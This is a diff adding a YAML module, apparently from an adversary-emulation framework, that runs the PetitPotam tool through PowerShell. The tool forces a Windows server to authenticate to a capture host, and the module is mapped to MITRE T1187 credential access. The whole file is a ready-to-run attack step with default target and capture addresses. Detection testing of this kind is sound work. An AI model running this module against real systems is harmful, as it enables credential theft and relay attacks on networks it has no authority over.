@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: PetitPotam
+description: |
+    This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.
+args:
+    - name: captureServerIP
+      type: string
+      default: 10.0.0.3
+    - name: targetServerIP
+      type: string
+      default: 10.0.0.2
+    - name: efsApi
+      type: integer
+      default: "1"
+    - name: petitpotam_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe
+uuid: 485ce873-2e65-4706-9c7e-ae3ab9e14213
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1187: Forced Authentication'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: petitpotam
+      inline: |
+        & "{{.Args.petitpotam_path}}" {{.Args.captureServerIP}} {{.Args.targetServerIP}} {{.Args.efsApi}}
+        Write-Host "End of PetitPotam attack"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
